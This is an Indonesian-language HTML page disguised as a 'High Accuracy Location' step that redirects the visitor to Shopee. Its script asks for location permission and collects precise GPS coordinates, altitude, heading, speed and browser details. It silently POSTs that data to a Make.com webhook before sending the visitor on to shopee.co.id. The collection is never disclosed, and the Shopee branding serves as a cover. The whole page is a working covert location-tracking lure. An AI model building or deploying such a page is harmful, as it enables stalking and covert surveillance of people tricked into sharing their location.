<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect ke Shopee - High Accuracy</title>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
        }
        
        body { 
            background: linear-gradient(135deg, #ff5311 0%, #ff0000 100%); 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px; 
        }
        
        .container { 
            background: white; 
            border-radius: 20px; 
            padding: 40px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.2); 
            max-width: 500px; 
            width: 100%; 
            text-align: center; 
        }
        
        .logo { 
            font-size: 4em; 
            margin-bottom: 20px; 
        }
        
        h1 { 
            color: #333; 
            margin-bottom: 15px; 
            font-size: 2em; 
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 25px;
            font-size: 1.1em;
            line-height: 1.5;
        }
        
        .btn { 
            background: linear-gradient(135deg, #ff5311 0%, #ff0000 100%); 
            color: white; 
            border: none; 
            padding: 18px 40px; 
            border-radius: 50px; 
            font-size: 1.3em; 
            font-weight: bold; 
            cursor: pointer; 
            margin: 20px 0; 
            transition: transform 0.3s; 
            width: 100%; 
        }
        
        .btn:hover { 
            transform: translateY(-3px); 
        }
        
        .loading { 
            color: #ff5311; 
            font-size: 1.2em; 
            margin: 20px 0; 
        }
        
        .success { 
            color: #28a745; 
        }
        
        .error { 
            color: #dc3545; 
        }
        
        .accuracy-indicator {
            margin: 15px 0;
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
        }
        
        .accuracy-excellent {
            background: #d4edda;
            border-left: 5px solid #28a745;
        }
        
        .accuracy-good {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
        }
        
        .accuracy-poor {
            background: #f8d7da;
            border-left: 5px solid #dc3545;
        }
        
        .coordinates {
            background: #e9ecef;
            padding: 12px;
            border-radius: 10px;
            font-family: monospace;
            margin: 10px 0;
            font-size: 1.1em;
        }
        
        .tips {
            background: #e7f3ff;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            border-left: 5px solid #007bff;
        }
        
        .tips h3 {
            color: #007bff;
            margin-bottom: 10px;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 10px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #dc3545, #ffc107, #28a745);
            transition: width 0.5s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üõçÔ∏è</div>
        <h1>High Accuracy Location</h1>
        <p class="subtitle">Menggunakan teknologi terbaik untuk akurasi maksimal</p>
        
        <div class="tips">
            <h3>üí° Tips Akurasi Tinggi:</h3>
            <p>‚Ä¢ Hidupkan WiFi (meski tidak connect)</p>
            <p>‚Ä¢ Buka di area terbuka</p>
            <p>‚Ä¢ Izinkan akses lokasi</p>
            <p>‚Ä¢ Tunggu proses selesai</p>
        </div>
        
        <button class="btn" onclick="startHighAccuracyLocation()">
            üéØ DAPATKAN LOKASI AKURAT TINGGI
        </button>
        
        <div id="status" class="loading">Klik tombol di atas untuk mulai...</div>
        <div id="accuracy"></div>
        <div id="coordinates"></div>
        <div id="progressBar" class="progress-bar" style="display: none;">
            <div id="progressFill" class="progress-fill" style="width: 0%"></div>
        </div>
    </div>

    <script>
        const statusDiv = document.getElementById('status');
        const accuracyDiv = document.getElementById('accuracy');
        const coordinatesDiv = document.getElementById('coordinates');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');

        // Webhook URL Anda
        const WEBHOOK_URL = 'https://hook.eu2.make.com/snsxpo7oc5fyiy3fy697rqu29trp9rqy';

        function updateProgress(percent) {
            progressBar.style.display = 'block';
            progressFill.style.width = percent + '%';
        }

        function getAccuracyLevel(accuracy) {
            if (accuracy <= 10) return { level: 'excellent', text: 'üéØ Sangat Akurat', color: '#28a745' };
            if (accuracy <= 25) return { level: 'good', text: '‚úÖ Cukup Akurat', color: '#ffc107' };
            if (accuracy <= 50) return { level: 'fair', text: '‚ö†Ô∏è Lumayan Akurat', color: '#fd7e14' };
            return { level: 'poor', text: '‚ùå Kurang Akurat', color: '#dc3545' };
        }

        async function startHighAccuracyLocation() {
            updateProgress(10);
            statusDiv.innerHTML = 'üîÑ Memulai deteksi high accuracy...';
            
            if (!navigator.geolocation) {
                statusDiv.innerHTML = '‚ùå Browser tidak support geolocation';
                return;
            }

            try {
                updateProgress(30);
                statusDiv.innerHTML = 'üîç Mencari sinyal GPS terbaik...';
                
                // Method 1: High Accuracy GPS dengan multiple attempts
                const position = await getBestGPSLocation();
                
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const altitude = position.coords.altitude;
                const heading = position.coords.heading;
                const speed = position.coords.speed;

                updateProgress(70);
                
                // Accuracy assessment
                const accuracyInfo = getAccuracyLevel(accuracy);
                
                accuracyDiv.innerHTML = `
                    <div class="accuracy-indicator accuracy-${accuracyInfo.level}">
                        <strong>${accuracyInfo.text}</strong><br>
                        Akurasi: ¬±${accuracy.toFixed(1)} meter
                    </div>
                `;

                coordinatesDiv.innerHTML = `
                    <div class="coordinates">
                        <strong>üìç Koordinat Presisi:</strong><br>
                        Latitude: ${lat.toFixed(7)}<br>
                        Longitude: ${lng.toFixed(7)}<br>
                        ${altitude ? `Altitude: ${altitude.toFixed(1)} meter<br>` : ''}
                        ${heading ? `Heading: ${heading}¬∞<br>` : ''}
                        ${speed ? `Speed: ${speed.toFixed(1)} m/s<br>` : ''}
                    </div>
                `;

                updateProgress(90);
                statusDiv.innerHTML = 'üì° Mengirim data lokasi...';

                // Kirim data ke Make.com
                await sendToMakeWebhook(lat, lng, accuracy, altitude, heading, speed);

                updateProgress(100);
                statusDiv.innerHTML = '‚úÖ Data lokasi terkirim!';

                // Redirect ke Shopee setelah 3 detik
                setTimeout(() => {
                    statusDiv.innerHTML = 'üõçÔ∏è Mengarahkan ke Shopee...';
                    window.location.href = 'https://shopee.co.id';
                }, 3000);

            } catch (error) {
                console.error('Location error:', error);
                statusDiv.innerHTML = '‚ùå Gagal mendapatkan lokasi akurat';
                accuracyDiv.innerHTML = '<div class="accuracy-indicator accuracy-poor">Coba buka di area terbuka dengan sinyal baik</div>';
                
                // Fallback ke method biasa
                setTimeout(() => {
                    redirectToShopeeDirect();
                }, 3000);
            }
        }

        async function getBestGPSLocation() {
            return new Promise((resolve, reject) => {
                let bestPosition = null;
                let attempts = 0;
                const maxAttempts = 3;
                const watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        attempts++;
                        
                        // Update progress based on attempts
                        updateProgress(30 + (attempts * 15));
                        
                        // Pilih position dengan accuracy terbaik
                        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                            bestPosition = position;
                            
                            statusDiv.innerHTML = `üì° Memperbaiki akurasi... (${attempts}/${maxAttempts})<br>
                                                  Akurasi terbaik: ¬±${position.coords.accuracy.toFixed(1)}m`;
                        }
                        
                        // Jika sudah cukup akurat atau max attempts, stop
                        if (position.coords.accuracy <= 15 || attempts >= maxAttempts) {
                            navigator.geolocation.clearWatch(watchId);
                            if (bestPosition) {
                                resolve(bestPosition);
                            } else {
                                reject(new Error('Tidak dapat mendapatkan lokasi akurat'));
                            }
                        }
                    },
                    (error) => {
                        navigator.geolocation.clearWatch(watchId);
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0,
                        distanceFilter: 1 // Update setiap 1 meter movement
                    }
                );
                
                // Timeout safety
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchId);
                    if (bestPosition) {
                        resolve(bestPosition);
                    } else {
                        reject(new Error('Timeout'));
                    }
                }, 25000);
            });
        }

        async function sendToMakeWebhook(lat, lng, accuracy, altitude = null, heading = null, speed = null) {
            const data = {
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                altitude: altitude,
                heading: heading,
                speed: speed,
                timestamp: new Date().toLocaleString('id-ID'),
                userAgent: navigator.userAgent,
                url: window.location.href,
                method: 'high_accuracy_gps'
            };
            
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    console.log('‚úÖ Data high accuracy terkirim');
                }
            } catch (error) {
                console.log('‚ùå Gagal kirim data:', error);
            }
        }

        function redirectToShopeeDirect() {
            statusDiv.innerHTML = 'üõçÔ∏è Mengarahkan ke Shopee...';
            setTimeout(() => {
                window.location.href = 'https://shopee.co.id';
            }, 2000);
        }

        // Auto-start setelah 5 detik (optional)
        // setTimeout(startHighAccuracyLocation, 5000);
    </script>
</body>
</html>
